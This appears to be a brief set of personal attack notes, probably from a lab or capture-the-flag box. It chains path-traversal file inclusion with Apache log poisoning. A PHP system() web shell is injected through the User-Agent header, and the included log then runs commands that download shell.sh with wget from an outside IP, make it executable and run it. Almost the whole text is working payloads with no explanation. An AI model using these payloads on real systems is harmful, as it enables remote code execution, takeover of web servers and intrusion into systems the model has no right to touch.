## Add c to apache2 log file through burp suite
	?view=/var/www/html/development_testing/../../../../../var/log/apache2/access.log
		User-Agent: Mozilla/5.0 <?php system($_GET['c']); ?> Firefox/115.0

## Upload shell and execute it
	?view=/var/www/html/website/../../../../../var/log/apache2/access.log&c=wget http://10.8.79.239:8000/shell.sh -O /tmp/shell.sh

	?view=/var/www/html/website/../../../../../var/log/apache2/access.log&c=chmod +x /tmp/shell.sh

	?view=/var/www/html/website/../../../../../var/log/apache2/access.log&c=bash /tmp/shell.sh